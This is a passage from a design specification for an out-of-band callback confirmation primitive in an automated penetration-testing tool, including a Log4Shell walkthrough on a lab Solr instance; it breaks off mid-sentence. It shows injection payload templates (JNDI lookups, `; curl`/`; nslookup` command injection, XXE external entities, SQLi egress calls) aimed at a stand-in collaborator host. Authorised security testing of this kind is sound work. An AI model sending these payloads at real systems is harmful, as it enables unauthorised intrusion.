# P6 — Out-of-Band Confirmation Primitive — Design Specification

> **Status:** v0 — think-on-paper design. **No code, no schema, no PR.**
> This document exists to be pressure-tested with the owner *before* any
> implementation, exactly like [`docs/discovery-engine-design.md`](./discovery-engine-design.md).
> Every "shape" sketch is illustrative of intent, not a class to be committed.
> The open-questions list (§P6.7) is the real point — read it last, believe it most.
>
> **Audience / grounding.** This extends the discovery-engine design. Read that
> first — this doc assumes its model (`Vulnerability = Δ-Capability ×
> Untrusted-Channel-Reachability × Provable-Impact`), the confirmation-primitive
> vocabulary P1–P6 (§6.1), the proof-budget economics (§4.3.1), the raw-auditable
> `ConfirmationEvidence` pair (§4.6), and the roadmap's primitive spine (§8). It
> designs the **one unbuilt primitive, P6**, which §8.1 already names as the
> precondition for the entire blind-egress half of the vuln universe.
>
> Where this doc cites `§N.M` it means a section of `discovery-engine-design.md`;
> where it cites `§P6.M` it means a section of *this* doc.

---

## P6.0 · TL;DR

Five of Clinkz's six confirmation primitives are built and validated on real CVEs
(SSRF ×2 codebases, file-read — all **in-band**, zero-FP, raw-auditable). The
sixth, **P6 — out-of-band callback**, is not built, and it is not one methodology
among many: it is a **product-boundary move**. Per the roadmap's boundary-as-feature
spec (§8), a vuln class is discoverable **iff** its proof obligation reduces to a
built confirmation primitive. Every *blind* class — blind SSRF, blind CMDi, blind
XXE exfil, deserialization RCE, DNS-exfil SQLi, and the flagship **Log4Shell** — has
a proof obligation that reduces to P6 *or to nothing*. So until P6 exists, none of
them is emittable, and they are (correctly, by the spec) not emitted.

P6's confirmation obligation is a single sentence:

> **An inbound callback bearing this probe's unique nonce reaches a
> Clinkz-controlled collaborator within the wait window.**

That obligation is **unforgeable by construction** (§P6.2): the nonce is minted at
dispatch and embedded *only* in the one outbound probe, so a packet bearing it can
only exist if something that received the probe **executed the egress capability**.
There is no reflection channel to the collaborator, so the confounder that every
in-band guard exists to defeat — input reflection — is *structurally absent*. P6 is,
if anything, the cleanest zero-FP primitive of the six.

It is also the **most expensive job class** (§P6.3): a P6 job spends *wall-clock
time* waiting for a callback, not HTTP requests. The make-or-break economics is that
P6 must be **evented (fire-and-reap), never a blocking per-job wait** — send all
blind probes up front, reap callbacks concurrently against one shared window. And it
buys zero-FP at an honest price: **a callback that never comes is *inconclusive*, not
*safe*** — egress-filtered (or patched) targets yield a silence P6 cannot itself
disambiguate. That false-*negative* floor is the inverse of the in-band engine's
false-*positive* discipline, and it is un-fixable by design; it must be *reported*,
never hidden.

The recommended build order isolates the new variable: **first prove P6 on a blind
SSRF we already confirm in-band** (same `EGRESS_FETCH` class, same `_test_ssrf`, same
`STATIC_CONFIRMED` reachability — only the confirmation changes), *then* attempt the
Log4Shell capstone, which additionally needs a log-sink reachability channel that is
**not yet built**.

---

## P6.1 · OOB collaborator infrastructure

### P6.1.1 What the collaborator is

A **receive-only listener** that records inbound network events — DNS lookups,
HTTP(S) requests, and (for completeness) LDAP/RMI connect attempts — each tagged by a
**unique token** carried in the event (the leftmost DNS label, the HTTP path/Host, or
the LDAP DN), and exposes one query: *"has any inbound event bearing token T
arrived, and what were its bytes?"* This is the Burp-Collaborator / interactsh /
dnslog shape the roadmap's DEFERRED section already commits to ("a listener service
(DNS/HTTP callback, in the Burp-Collaborator / interactsh mould)").

It is a **sink, not a proxy.** It never initiates a connection to anything except to
answer a DNS query *for its own address*. It cannot be steered anywhere (§P6.1.5).

### P6.1.2 Two provisioning modes, scenario-selectable

The handoff plan (roadmap DEFERRED) calls for both a self-hosted option and an
interactsh-style option. They share one token/correlation contract; only the
transport differs. Selected by config, defaulting to **disabled** so the black-box
floor is unchanged (P6 is strictly opt-in):

```
OOB_COLLABORATOR_MODE = disabled | docker | external      # default: disabled
```

| Mode | When | Reachability story | Guardrail posture |
|---|---|---|---|
| **`docker`** (self-hosted) | Lab / CTF / self-owned targets (DVWA, Juice Shop, Vulhub). **Default for the first build.** | Sibling container `clinkz-collab` on the existing `pentest-targets` bridge (`172.20.0.0/24`, `docker/docker-compose.yml`), with a stable network alias/zone. The target reaches it **without any real internet egress** — traffic never leaves the engagement's bridge. | Strongest: nothing leaves the lab network at all. |
| **`external`** (interactsh-style) | Real remote engagements where the target has internet egress but no route to a lab-internal address. | Clinkz is a *client* of a **self-hosted** interactsh server (register → poll by token). | Self-hosted server **required**; the public shared interactsh server is **refused**, not defaulted (§P6.1.5, §P6.7.8). |
| **`disabled`** | Default. | — | Blind hypotheses defer and emit nothing, exactly as today (`blind_suspected`). |

The docker mode is the load-bearing one for validation: a sibling on the shared
bridge **guarantees egress**, which is precisely what isolates the P6 primitive from
the egress-filtered false-negative floor during its first build (§P6.6).

### P6.1.3 Per-engagement provisioning

Provisioned in the Orchestrator's start-up preflight, alongside the existing
`ensure_container_ready` / `validate_agent_chains` / credit-preflight steps:

1. Bring up (docker mode) or register-with (external mode) the collaborator; obtain
   its **base zone** (e.g. `*.oob.clinkz.test`) and reachable address.
2. Record `(engagement_id, collaborator_zone, collaborator_addr)` into engagement
   state (`clinkz.db`), so every P6 probe mints tokens under *this engagement's* zone.
3. **Health-check the loop before trusting it** (§P6.7.1): mint a probe token, have
   Clinkz itself hit `http://<token>.<zone>/` (and do a DNS lookup for it), confirm
   the collaborator recorded it. Only a *healthy* collaborator is allowed to turn a
   blind non-confirmation into an operator research-lead — otherwise a dead
   collaborator masquerades as a clean target (silence read as safety).
4. Teardown at engagement end; the event log is bounded and per-engagement.

The collaborator lifecycle mirrors the existing container preflight discipline
(`tools/docker_preflight.py`): if it can't come up, P6 degrades to `disabled` and the
run completes on the in-band half — logged transparently, never a hard failure.

### P6.1.4 Token minting, embedding, and correlation

**Mint (per probe).** Each P6 job mints a **cryptographically-random single-use
nonce** T (≥16 bytes, base32, DNS-label-safe lowercase) and records
`(T, engagement_id, hypothesis_id, probe_ordinal, sent_at)` in a per-engagement
**correlation table** (`clinkz.db`). T is an opaque nonce — it carries no secret and
encodes no target data (§P6.1.5); the mapping T → hypothesis lives Clinkz-side.

**Embed (carrier's job).** The callback host handed to the payload is
`<T>.<zone>`. Embedding is done by the **probe carrier**, exactly like the existing
per-instance carrier constraints (`CARRIER_ALIGN_HOST`, `CARRIER_PATH_TRAVERSAL` in
`discovery/constants.py`): a new obligation-level carrier supplies the zone, and the
carrier substitutes `<T>.<zone>` into the payload template *at send time*. The
primitive and obligation stay **payload-free**; only the concrete probe carries the
nonce. Examples:

| Class | Payload template (payload-free in the catalog) | Embedded at send |
|---|---|---|
| blind SSRF (`EGRESS_FETCH`) | `http://<oob>/` | `http://k7f3…q2.oob.clinkz.test/` |
| Log4Shell (`EGRESS_FETCH` via log sink) | `${jndi:ldap://<oob>/x}` | `${jndi:ldap://k7f3…q2.oob.clinkz.test/x}` |
| blind CMDi (`CODE_EVAL`) | `; nslookup <oob>` / `; curl http://<oob>/` | … |
| blind XXE `oob_exfil` | external parameter-entity to `http://<oob>/e.dtd` | … |

**Correlate (poller's job).** An inbound event → extract T from the leftmost DNS
label / HTTP path or Host / LDAP DN → look up the correlation table → the **exact**
`(hypothesis_id, probe_ordinal)`. Because T is per-probe and single-use, a callback
maps to **exactly one** hypothesis even with many blind probes in flight
concurrently. (A shared collaborator domain with no per-probe token could not tell
which of N probes fired — the nonce is what makes concurrent blind probing
correlatable.)

### P6.1.5 Scope / safety guardrail (the load-bearing part)

The collaborator is *attacker-controlled infrastructure*. The two dangers are (a) it
becomes a channel to **exfiltrate data out of the engagement**, and (b) it is
**steered out of scope**. Six structural guardrails, in priority order:

1. **The collaborator host is minted by Clinkz, never derived from observed
   content.** The zone is fixed at provisioning; a probe can only ever embed
   `<T>.<our-zone>`. No LLM output, no target response, no source fact can change the
   callback host. This is the *instruction-source boundary applied at the infra
   level* — the same rule that keeps `CARRIER_ALIGN_HOST` from following an
   attacker-supplied host.
2. **The nonce is a nonce, not a data channel.** The payload embeds **only**
   `<T>.<zone>` — never target data. Clinkz does **not** build "exfiltrate `/etc/passwd`
   over DNS subdomains" payloads. **P6 proves the capability *fired*; it never uses
   the collaborator to *move target data*.** Concretely: the DNS label is the nonce
   only; file bytes are never encoded into subdomains. Where a genuine blind
   read/exfil vuln would *need* data returned OOB, that escalation is deliberately
   **not built** — bare-callback confirmation needs no data. **This must be enforced
   at the carrier** (the carrier substitutes only the nonce, structurally incapable
   of interpolating target-derived data), *not* by convention (§P6.7.4).
3. **The collaborator is receive-only; it can never be steered.** It initiates
   nothing except a DNS *answer* pointing at *its own* address. There is no
   "fetch-then-forward" hop, so it cannot be turned into an SSRF relay to an
   out-of-scope host.
4. **Clinkz's own HTTP client still only ever connects to the in-scope target.** A
   blind SSRF probe points the *target* at `http://<T>.<zone>/`; the collaborator is
   Clinkz-owned infra Clinkz *runs*, not a host Clinkz *connects to*. So the existing
   SSRF safety model is unchanged: the internal/collab URL rides as a param **value**
   in a request to the in-scope target, and `scope.contains` still validates the
   *request URL host* (the target). No scope check is bypassed. Note the framing
   flip: "is the callback host in scope?" is the *wrong* question — the callback host
   is deliberately *ours*.
5. **In-engagement (docker) / self-hosted-only (external).** Docker mode keeps every
   byte on the bridge. External mode **requires an explicit self-hosted server URL and
   refuses the public shared interactsh server** — because callbacks can carry
   target-identifying data (callback host, timestamps, source IPs) and landing those
   on third-party infra is a data-hygiene and legal-boundary breach (§P6.7.8).
6. **Bounded, redacted, torn-down retention.** The event log is bounded per
   engagement and destroyed at teardown; recorded HTTP bodies are bounded excerpts
   and redaction-safe — the same `ConfirmationEvidence` discipline (no secret values
   persisted; a marker/field-name only).

---

## P6.2 · P6 confirmation semantics (zero-FP)

### P6.2.1 The reduction

A blind hypothesis reduces to **P6** iff its proof obligation is exactly:

> "an inbound callback bearing this probe's unique nonce T reaches the collaborator
> within the wait window."

That is the *only* obligation P6 expresses. Nothing about response bodies, status
codes, timings, or reflections — those are P1–P5. P6 is binary: the nonce came back,
or it did not.

### P6.2.2 Why it's unforgeable ⇒ zero-FP by construction

- T is a fresh cryptographic nonce minted at dispatch and embedded **only** in the
  one outbound probe sent to the target. It exists **nowhere else** — not in the
  catalog, not in prior traffic, not in any response, not guessable (astronomically
  large space).
- The **only** way a packet bearing T reaches the collaborator is if *something that
  received the probe executed the capability that performs the outbound
  fetch/lookup* — the target parsed the payload, resolved the interpolation / JNDI /
  URL fetch, and egressed to `<T>.<zone>`. **The callback is the capability firing,
  observed directly — not a correlate of it.**
- Every in-band phantom class is structurally impossible here:

  | In-band failure mode (what P1–P5 guards fight) | Can it forge a P6 callback? |
  |---|---|
  | Marker **reflected** in the response body | **No** — reflecting T in an HTTP *response to us* is not a network callback *to a third host*. No reflection channel reaches the collaborator. |
  | Marker in a **4xx/5xx / stack-trace** error page | **No** — same reason; an error page is a response, not an egress. |
  | Marker in **page chrome** / benign baseline | **No** — chrome is static response content; it cannot emit a nonce that did not exist until dispatch. |
  | **Coincidence** | **No** — the nonce space makes an accidental T collision negligible. |

  The confounder that *all* the in-band honesty guards exist to defeat — input
  reflection — is **absent by construction** for P6. That is why P6 is the cleanest
  zero-FP primitive of the six, not the riskiest.

- **The one residual confounder, named and killed.** A callback bearing T from
  something *other than the in-scope target's execution* would muddy attribution.
  Killed by: (i) T is per-probe unique and single-use ⇒ maps to exactly one
  hypothesis; (ii) T was sent to **exactly one target**, so *whatever* executed the
  egress received it from that probe; (iii) the callback **source IP** is recorded as
  a **soft corroborator** — *not a hard gate*, because DNS-based JNDI/exfil arrives
  from the target's **resolver**, not the target itself, and NAT/cloud egress rewrites
  the source. The **nonce is the hard proof**; the source IP only helps distinguish
  "direct egress" from "via resolver" and flag an anomaly for the operator. Stating
  this honestly matters: source-IP matching is advisory, the nonce is authoritative.

### P6.2.3 Wait / timeout / correlation model

- **Dispatch does not block.** On send, the P6 job records `(T, hypothesis, sent_at)`,
  marks itself **pending-OOB**, and **returns to the scheduler immediately**. This is
  the budget-critical property (§P6.3).
- **One collaborator poller per engagement** (a single async task) receives/polls
  inbound events and matches tokens against the pending table. Sending is decoupled
  from waiting: send N blind probes, then reap callbacks as they arrive.
- **Per-job wait deadline** `sent_at + OOB_WAIT_WINDOW`. Callback bearing T **before**
  the deadline ⇒ **confirmed**. Deadline elapses with no callback ⇒ **not confirmed
  ⇒ emits nothing**, recorded as `blind_unconfirmed` (§P6.3, an operator
  research-lead — *not* `not_vulnerable`).
- **Exact, idempotent correlation.** Nonce → one hypothesis. Multiple callbacks for
  the same T (a DNS lookup *then* its HTTP follow) collapse to **one** confirmation.

### P6.2.4 Raw-auditable evidence pair for a blind confirm

The in-band engine's zero-FP is *auditable* because every confirmation persists a
`ConfirmationEvidence` pair — the confirming excerpt + the control it was
distinguished against (§4.6; `models/methodology.py`). P6 must meet the same
independent-re-derivability bar. Its pair is:

| Half | In-band (P1–P5) | **P6 (out-of-band)** |
|---|---|---|
| **Confirming** | the response bytes anchored on the marker | **the OUTBOUND probe carrying T** (method, endpoint, param + payload template with `<T>.<zone>`) **and the INBOUND callback carrying T** (timestamp, protocol, source IP, observed host/path — bounded) |
| **Control** | the without-carrier / non-resolving re-probe that did **not** reflect | **structural:** T is a fresh nonce that **did not exist before dispatch** (so no inbound bore T before the probe), *and* a benign control token T₀ on the same param produces **no callback** |

So the persisted proof is literally: *"we sent nonce T to the target here (outbound);
T came back to our listener here, Δt ms later (inbound); T was random and placed only
in that one probe; a control token stayed silent."* A reviewer re-derives the verdict
with zero trust in Clinkz's assertion — the same standard as the in-band excerpt/
control pair.

**Model extension (minimal).** `ConfirmationEvidence` today carries a confirming
*response* + control *response* (in-band). For P6 the confirming signal is an
**inbound callback**, not a response to our request. Extend the *general* shape with
one optional field and document the P6 convention — P6 becomes its **third consumer**
(SSRF P3 was first, file-read P3 second):

```
ConfirmationEvidence (extended — illustrative, not an implementation)
  primitive            = "P6"
  confirming_target    = "<T>.<zone>"                 # the callback host we minted (safe to show)
  confirming_marker    = T                            # the nonce (opaque; no secret, no target data)
  outbound_probe       = "GET /…?p=${jndi:ldap://<T>.<zone>/x}"   # NEW optional field: the probe that carried T
  confirming_excerpt   = "<inbound callback record: proto=DNS src=… host=<T>.<zone> at=…>"  # the inbound event (bounded)
  control_label        = "fresh single-use nonce; no inbound bore T before dispatch; benign control token silent"
  control_confirms     = False                        # MUST be False — T appeared only after we sent it
```

---

## P6.3 · Proof-budget economics (§4.3.1)

§4.3.1 already calls a P6 job "the most expensive unit, because it spends *time*, not
requests." This section sizes the *shape* of that cost (not the constants — those are
open-question #1, unsized).

### P6.3.1 Why P6 is the most expensive job class

- A **Tier-A** job (bind to a `_test_*`) is a bounded probe burst — baseline +
  differential + verify — **seconds**.
- A **Tier-B** job adds an LLM planning call.
- A **P6** job adds a **wall-clock wait** for a callback that may never arrive.
  Naïvely serial — *send probe, block for `OOB_WAIT_WINDOW`, next* — a batch of K
  blind hypotheses costs **K × window** (minutes-to-hours) and **stalls the whole
  exploit phase**, which by default has **no** deadline (`EXPLOIT_PHASE_BUDGET=0`,
  `config.py`). Nothing today stops that stall.

### P6.3.2 The fix: decouple send from wait (fire-and-reap)

The scheduler dispatches **all** P6 probes up front (each cheap — one outbound
request + a token record), marks them pending-OOB, and the single poller reaps
callbacks **concurrently** against **one shared window**. Because every token is
outstanding simultaneously and any can call back at any time within the window, the
**total** P6 wall-clock is **one `OOB_WAIT_WINDOW`** (the max over the batch), not the
**sum**:

```
serial (wrong):     Σ over K hypotheses of  (send + WAIT)      ≈ K × WAIT   → stalls
fire-and-reap:      (K cheap sends)  +  one shared WAIT         ≈ WAIT        → bounded
```

**This is the make-or-break economics: P6 must be evented, never a blocking per-job
wait.** The engine keeps dispatching in-band Tier-A/B tasks while P6 probes are
*parked* pending-OOB (parked, not spinning — a parked job consumes no dispatch slot),
and only *joins* the poller for the residual window at the tail, once, not per-job.

### P6.3.3 Budgeting model (explicit, counted — the §4.3.1 discipline)

P6 gets its **own counted budget lane**, distinct from the request/LLM budget:

| Knob | Role | Guard it implements (§4.3.1) |
|---|---|---|
| `OOB_WAIT_WINDOW` (e.g. 45s) | the single shared wall-clock the whole pending set drains against | bounds the tail wait |
| `OOB_MAX_PENDING` | cap on concurrent outstanding tokens | **guard 2: per-class candidate cap** — a low-confidence blind flood can't mint unbounded probes |
| **reserved OOB lane** | P6 jobs draw from a reserved share; parked jobs don't consume the in-band round-robin's slots | **guard 1: partition budget by prior class** — blind hypotheses neither starve nor are starved by in-band convergent ones |
| `OOB_REACH_CONFIDENCE_FLOOR` | minimum `reach_confidence` to spend an OOB probe at all | **guard 3: confidence floor** — below it a blind hypothesis goes straight to research-lead, never mints a token |

The ranking (`Δ-grade × reach_confidence × primitive_evidence_grade`, §6.4) still
decides *order and spend*; the live callback still decides *emission*. Sizing the
window, the pending cap, the reserved share, and the floor is **open-question #1** —
named, not solved.

### P6.3.4 The false-negative risk (foregrounded, un-fixable by design)

**A callback that never comes is NOT proof of not-vulnerable.** P6 is
**egress-dependent**: it confirms only when the target can *reach* the collaborator.
An egress-filtered target (no outbound, an egress proxy that blocks the zone, DNS-only
egress while we listen only on HTTP) **never calls back even when genuinely
vulnerable**. Therefore:

- A P6 non-confirmation is recorded as **`blind_unconfirmed` (egress may be
  filtered)** — a distinct outcome that becomes an **operator research-lead** (the
  existing "un-provable but suspicious" channel, §7.2), **never** a silent drop and
  **never** `not_vulnerable`. The report must say *"blind hypothesis H was probed via
  OOB; no callback within the window — inconclusive, egress may be filtered,"* not
  *"H is safe."*
- This is the honest inverse of the in-band engine's zero-FP: **P6 buys zero
  false-positives (a callback can't lie) at the cost of false-*negatives* under
  egress filtering (silence isn't safety).** The failure mode moves from
  false-positive (visible, catchable) to false-negative (invisible) — the same
  relocation §4.3 warns about for reachability, now intrinsic to the primitive.
- **P6 cannot distinguish *patched* from *egress-filtered* from
  *wrong-protocol-listener*** — all three are silence. Only orthogonal signals (the
  manifest version, an in-band tell) disambiguate. Docker mode (§P6.1.2) sidesteps
  this for *lab* targets by guaranteeing egress — which is exactly why the first
  validation uses it (§P6.6).

---

## P6.4 · Engine integration

### P6.4.1 Dispatch through the existing proof seam — no new seam

A blind hypothesis lowers **exactly** like every discovery hypothesis today
(`DiscoveryHypothesis.to_exploit_task()` → `ExploitTask` → `_merge_discovery_tasks`
plan-union → round-robin `_step_execute_exploits` → `_persist_finding` dedup). The
*only* differences are (a) the obligation's `confirmation_primitives = ["P6"]`, and
(b) the task carries an **OOB carrier constraint** (a new sibling of `CARRIER_ALIGN_HOST`
/ `CARRIER_PATH_TRAVERSAL`) so the probe carrier substitutes `<T>.<zone>`.

**Recommended shape: one shared `_oob_confirm` helper + un-prune the deferral points
that already exist.** The blind branches are *already stubbed as deferred* across the
proof engine — P6 turns those dead branches live rather than adding new methodologies:

| Today (deferred, emits nothing) | Location | With P6 |
|---|---|---|
| SSRF `blind_suspected` (fetch confirmed, no in-band reflection) → `BLIND_DEFERRED` | `exploit.py` ~L8911 | mint T, embed `<T>.<zone>` as the fetch target, park pending-OOB, confirm on callback |
| CMDi `BLIND_OOB` pruned from ranking | `exploit.py` ~L11901 | un-prune; `; nslookup <T>.<zone>` → callback |
| XXE `oob_exfil` pruned (no collaborator) | `exploit.py` ~L7559 | un-prune; external-param-entity to `http://<T>.<zone>/e.dtd` → callback |

`_oob_confirm(token_base, payload_template, channel)` is the P6 analogue of the
Tier-B "generic obligation runner" (§6.3) — **but constrained to the single P6
discriminator**, which is exactly what keeps it zero-FP. It mints the nonce, sends via
the existing carrier, registers pending, and the poller resolves it. So P6 lands as
**one new confirmation helper + un-pruning already-present deferral points**, not N
new methodologies — the same "reuse the built oracle, add zero new proof code"
discipline that let `FILE_READ` reuse `_test_lfi`/P3.

### P6.4.2 The catalog side

P6 capability classes get catalog entries whose
`proof_obligation.confirmation_primitives = ["P6"]`. Crucially, **P6 mostly reuses
existing `PrimitiveClass` values** — it changes the *confirmation*, not always the
*class*:

- **Blind SSRF is `EGRESS_FETCH` with a P6 obligation** instead of P3/P1. Same class,
  same `_test_ssrf`. The obligation's primitive set is what says "confirm blind."
- **Log4Shell is *also* fundamentally `EGRESS_FETCH`** (a JNDI lookup *is* an outbound
  fetch) — reached via a **log-sink channel** rather than a request param, confirmed
  via P6. The capability class is not new; the **channel** (log sink) and the
  **confirmation** (P6) are.
- **Deserialization** uses the **already-declared `PrimitiveClass.DESERIALIZE`**
  (`discovery/models.py`) — unbuilt today; its only safe confirmation is a P6 callback
  from a gadget chain (landing in-band RCE is neither safe nor reliable).

### P6.4.3 Which capability classes newly become reachable once P6 exists

Naming them, as the brief asks — this is the **entire blind-egress half** §8.1
promises P6 unlocks *in one step*:

| Class | Channel / carrier | Was (today) | With P6 |
|---|---|---|---|
| **Blind SSRF** (`EGRESS_FETCH`, no reflection) | URL param value → `http://<oob>/` | `blind_suspected`, emits nothing | confirmed on callback — **the isolation case (§P6.6)** |
| **Blind OS command injection** (`CODE_EVAL` / CMDi `BLIND_OOB`) | `; nslookup <oob>` / `; curl http://<oob>/` | pruned | confirmed on callback |
| **Blind XXE exfil / OOB** (XXE `oob_exfil`) | external parameter-entity → `<oob>/e.dtd` | pruned | confirmed on callback |
| **Deserialization → RCE** (`DESERIALIZE`) | gadget chain triggering outbound | declared, unbuilt | callback = the only safe proof |
| **Blind / DNS-exfil SQLi** | `xp_dirtree` / `UTL_HTTP` / `load_file(\\<oob>\x)` | time-based P5 only | cleaner OOB confirm where the DB can egress |
| **Log4Shell-class blind egress via a log sink** (`EGRESS_FETCH` via logging) | `${jndi:ldap://<oob>/x}` in a logged value | out of scope entirely | **the flagship (§P6.5)** |

---

## P6.5 · Flagship walkthrough — Log4Shell CVE-2021-44228

### P6.5.0 The environment (VERIFIED)

Vulhub `log4j/CVE-2021-44228`, confirmed against the upstream Vulhub README:

| Fact | Value |
|---|---|
| Application | **Apache Solr 8.11.0** |
| Port | **8983** |
| Vulnerable endpoint | **`GET /solr/admin/cores`** |
| Injected parameter | **`action`** (query) |
| Example trigger | `GET /solr/admin/cores?action=${jndi:ldap://${sys:java.version}.<host>}` |
| Vulnerable library | **`log4j-core` 2.14.1** |

A verified, deliberate tie-in: this is the **same product family** as the slice-2
Solr RemoteStreaming SSRF transfer (which used Solr **8.8.1**), a different version
(**8.11.0**). Solr's source is therefore **already partly ingestible** by the existing
`JavaSourceIngestor` — the walkthrough is not starting cold on an unfamiliar codebase.

The trace below runs the four discovery layers + P6 proof **on paper**, and is
explicit about **where it breaks**.

### P6.5.1 (cap) Capability — the egress hides inside the logging library

Log4j 2.x (≤2.14.1, and partials through 2.16) message interpolation resolves
`${...}` lookups, and the **JNDI lookup resolver performs an outbound network fetch**
(LDAP/RMI/DNS). Primitive: `message-lookup-interpolation`, class **`EGRESS_FETCH`** —
**the same class** as GeoServer/Solr SSRF. The catalog abstraction holds: Log4Shell is
egress-fetch reached via a log sink. Payload-free, **version-gated** on the
`log4j-core` version from `pom.xml` / the jar manifest.
`proof_obligation.confirmation_primitives = ["P6"]` — there is no in-band signal, so
it reduces to P6 **or nothing** (the whole point of §8.1). Catalog source: CVE-2021-44228
through the abstraction checkpoint (§3.4 path 1), **or** framework-source ingestion of
`log4j-core`'s `JndiLookup` / `StrSubstitutor` (§3.4 path 3).

**Verdict (cap): transfers cleanly.** The generic `EGRESS_FETCH` primitive already in
the catalog covers it; only the *confirmation* (P6) and the *channel* (log sink) are new.

### P6.5.2 (intent/Δ) — the intent-gap in its purest form

This is the **divergent / intent-gap** shape (§1.3) — the reason the discovery model
exists. Capability = "interpolate lookups incl. JNDI egress in **any** logged string."
Intent = "log the request's `action` for diagnostics." **Δ = the log sink is an
untrusted channel to an egress capability nobody modeled as untrusted.** There is no
call site that says "fetch"; there is a `logger.info("… action={}", action)`-shaped
call whose argument is request-derived, and the egress is *inside a third-party
library*. Δ-adjudication: the primitive is present (vulnerable `log4j-core` in the
manifest), un-gated (`log4j2.formatMsgNoLookups` unset — the 2.14.1 default) ⇒
**EXPOSED**. Gating config: `formatMsgNoLookups=true`, or ≥2.16 / `JndiLookup`
removed ⇒ subtract from Δ.

**Verdict (intent/Δ): recoverable, and it is the canonical high-Δ intent-gap** — the
"log line as untrusted channel" the model was built to name. The risk is version/gating
misread (§P6.5.5 point 2), not conceptual.

### P6.5.3 (reach) — the honest hard part, and it is *not* built

Untrusted channel = the `action` query param on `GET /solr/admin/cores`. Sink = a
Log4j logging call that interpolates a request-derived string. **The channel→sink path
is NOT intra-function.** The `action` value flows from Solr's request handler, through
core-admin dispatch, into a log statement, and the interpolation happens **deep inside
Log4j**. Realistic soundness grade: **`STATIC_HEURISTIC`** ("a request param reaches
*a* logging call in the handler's call tree") or **`HYPOTHESIZED`** without both Solr
*and* Log4j source ingested. This is the **log-sink channel class** the design flags as
"now, high value — a channel most scanners never model as untrusted" (§4.4).

**But the built reachability slice only does intra-function taint to file/fetch
sinks** (`reachability.py`, `source_ingest.py`). It does **not** enumerate **logging
calls as sinks**. So the hypothesis is **never generated** until a **log-sink
enumerator** is added (grep `log(ger)?\.(trace|debug|info|warn|error|fatal)\(` whose
argument is request-derived, emitting `STATIC_HEURISTIC`/`HYPOTHESIZED` edges).

**Verdict (reach): this is the #1 failure point — and it is reachability/recall, not
proof** (exactly as the zero-FP framing predicts: the flagship's remaining risk lives
*outside* the proof layer). P6 is *necessary but not sufficient* for Log4Shell; the
log-sink reachability channel is a **co-requisite**.

### P6.5.4 (proof) — P6, and only the bare lookup egress

Obligation: mint nonce T, embed `${jndi:ldap://<T>.<zone>/x}` as the `action` value
(carrier substitutes T; primitive stays payload-free), send
`GET /solr/admin/cores?action=${jndi:ldap://<T>.<zone>/x}`, park pending-OOB.
Confirmation = a **DNS lookup and/or LDAP connect for `<T>.<zone>`** reaches the
collaborator within the window. Unforgeable (T is a fresh nonce placed only in this
probe) ⇒ zero-FP.

**Critical guardrail in action: confirmation needs ONLY the bare JNDI *lookup*
egress — NOT the second-stage LDAP-referral RCE.** Clinkz does **not** stand up a
malicious LDAP server serving a gadget; it only observes the connect/DNS bearing T.
Severity is still **critical** (that egress *is* the RCE primitive on a vulnerable
JDK), but the **confirmation is the callback, not code execution** — P6 proves the
capability fired, it does not weaponize it (§P6.1.5 guardrail 2). Because the
collaborator must catch the **DNS leg** (DNS-only egress still confirms Log4Shell),
the collaborator **must** run an authoritative DNS server, not just HTTP (§P6.7.6).

**Verdict (proof): sound, in one P6 helper, unforgeable — no new confirmation logic
beyond P6.**

### P6.5.5 Where it would FAIL, if anywhere

1. **Reachability enumeration — the log-sink channel isn't built (the #1 break).**
   The current reachability layer only taints request params to file/fetch sinks. A
   logging call reached through a cross-function call tree, with interpolation inside a
   third-party lib, is not enumerated. **No log-sink enumerator ⇒ no hypothesis ⇒
   nothing to prove.** Recall/plumbing, outside the proof layer.
2. **Version / Δ precision.** Fingerprint-only (no manifest) inflates Capability to
   "Java + maybe Log4j" — the hypothesis is still generated (assume-vulnerable) but
   lower-ranked; a misread `formatMsgNoLookups`/version gate collapses Δ and drops it.
   Open-question #8 made concrete.
3. **Egress-filtered / DNS-scoped false-negative (the P6 floor).** If the target
   can't reach the collaborator — no outbound, egress proxy blocks the zone, or
   DNS-only egress while we listen only on HTTP — **no callback ⇒ inconclusive, not
   safe.** Vulhub docker mode (sibling on the bridge, DNS + HTTP legs) guarantees
   egress, so the fixture confirms; a hardened real target may be genuinely vulnerable
   yet never call back.
4. **The 2.15 / 2.16 partials.** 2.15 restricts JNDI to allowlisted hosts (our
   arbitrary `<T>.<zone>` may be blocked); 2.16 removes lookups (won't resolve at
   all). Both yield **silence** — a *correct* non-finding on a patched target, but
   **P6 cannot distinguish "patched" from "egress-filtered"**; only the manifest
   version can. The catalog **must** version-gate, or a patched target is scored a
   false-negative-that-looks-like-egress-filtering.

---

## P6.6 · First-validation isolation

**Isolate the new variable before the capstone.** The first P6 *build* should confirm
a **blind SSRF** — an `EGRESS_FETCH` capability we **already confirm in-band** on
GeoServer/Solr — via OOB **instead of** in-band, *before* attempting Log4Shell.

Why this is the right isolation:

- It introduces **exactly one new variable: the OOB confirmation primitive.** Same
  capability class (`EGRESS_FETCH`), same catalog-entry shape, same `_test_ssrf`
  methodology, same **intra-function `STATIC_CONFIRMED`** reachability we have already
  validated — **only the confirmation changes** from P3/P1 (in-band) to P6 (callback).
  A failure is then unambiguously *in P6*, not in a new class or a new channel.
- It has **ground truth.** Take the Solr `stream.url` SSRF (slice-2, already confirmed
  in-band) or a GeoServer-class fetch, point it at `http://<T>.<zone>/` instead of at
  loopback/metadata, and confirm on the callback. The in-band path already confirms
  the *same* vuln — so **P6 must agree with in-band on a vuln we KNOW is there.** That
  is the cleanest possible P6 unit: confirmed two ways, OOB must match in-band.
- Only after P6 is trusted on a known-vulnerable, known-reachable, **single-class**
  case do we add the **two** new variables Log4Shell needs — the **log-sink
  reachability channel** *and* the **divergent intent-gap hypothesis**. One variable
  at a time — the same discipline as slice-1 → slice-2 → file-read-class (each slice
  added exactly one new thing).

**Validation standard (clinkz-dev).** The isolation case must be a **real run against
a live target with a live LLM in the loop** — never a keyless/silent-LLM harness
(which pins the deterministic path and structurally cannot exercise a live confirm).
And the **`blind_unconfirmed` → inconclusive** outcome must be proven against an
instance where egress is **genuinely blocked** (e.g. deny the collaborator zone at the
target's egress), to confirm P6 says *"inconclusive"* and **not** *"safe."* Docker
mode gives the positive (egress guaranteed → confirm); a deliberately egress-denied
instance gives the honest negative.

---

## P6.7 · Open questions & research risks (foregrounded — the point of this doc)

These are unsolved. Surfacing them is the deliverable; do not read past them as if the
sections above closed them.

1. **Collaborator operational fragility (new infra, new failure surface).** P6 is the
   first Clinkz component that must be *reachable from the target*: a network service
   provisioned/torn-down per engagement, with DNS authority, a TLS cert for the HTTPS
